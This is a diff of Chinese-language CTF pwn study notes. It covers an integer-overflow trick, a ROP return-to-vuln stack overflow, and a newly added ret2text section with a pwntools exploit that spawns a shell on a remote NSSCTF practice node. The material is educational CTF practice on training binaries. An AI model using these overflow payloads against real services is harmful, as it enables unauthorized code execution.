@@ -1,7 +1,7 @@
 ---
 title: PWN刷题笔记
 published: 2026-04-12
-description: ..第一次参加长城杯...这AWDP和ISW是什么啊，我不是密码、Misc方向的吗...发愤转型Pwn。
+description: ..第一次参加长城杯...这AWDP和ISW是什么啊，我不是密码、Misc方向的吗...发奋转型Pwn。
 tags: [CTF, 学习,Pwn]
 category: CTF
 ---
@@ -28,7 +28,7 @@ category: CTF
 
 （大端序则反之）
 ![整数溢出](./images/zhengshuyichu.webp)
-如图，v4为4字节，却尝试用scanf将它视为%lld读入8字节整数，因此会覆盖到位于栈高字节的n1314（rbp-ch），当n1314等于520（0x208）时调用system，那便能拿到==shell==
+如图，v4为4字节，却尝试用scanf将它视为%lld读入8字节整数，因此会覆盖到位于栈高字节的n1314（rbp-ch），当n1314等于520（0x208）时调用system，那便能拿到shell
 
 因此输入0x20800000000在内存中为00 00 00 00 08 02,前面4个00即v4的内存区域，此时n1314被视为520
 
@@ -50,9 +50,9 @@ r.interactive()
 
 ## ROP
 ![ROP](./images/ROP1.webp)
-如图，scanf尝试向v4输入但没有上限(`%s`遇到回车才停止读取)，因此导致==栈溢出== 但是main函数里没有找到类似`system("/bin/sh")`的语句，于是通过查找字符串等方式我们不难发现在==vuln==这个函数中存在这个语句，那么我们的目的就是通过输入特定的字符串，让程序溢出到==vuln==函数
+如图，scanf尝试向v4输入但没有上限(`%s`遇到回车才停止读取)，因此导致栈溢出 但是main函数里没有找到类似`system("/bin/sh")`的语句，于是通过查找字符串等方式我们不难发现在vuln这个函数中存在这个语句，那么我们的目的就是通过输入特定的字符串，让程序溢出到vuln函数
 ![ROP2](./images/ROP2.webp)
-那么怎么return到==vuln==函数呢？其实让溢出的值是==vuln==函数的地址就行了。
+那么怎么return到vuln函数呢？其实让溢出的值是vuln函数的地址就行了。
 ```python
 from pwn import *
 context(os='linux',arch='amd64',log_level="debug")
@@ -68,3 +68,18 @@ r.interactive()
 ![flag](./images/ROP3.webp)
 
 ## ret2text
+![ret2text1](images/ret2text1.webp)
+![ret2text2](images/ret2text2.webp)
+这题其实和上一题没什么区别，只需要把跳转的地址转到if语句里就行了。**直接跳转到目标执行位置可以更好的解决问题**
+在ida里找到if语句的地址便可以写exp了
+![ret2text2](images/ret2text3.webp)
+```python
+from pwn import *
+r = remote('node6.anna.nssctf.cn', 20798)
+context(os='linux', arch='amd64', log_level='debug')
+playload = b"a"*0x28+p64(0x4011ff)
+#gdb.attach(r)
+r.recvline()
+r.sendline(playload)
+r.interactive()
+```
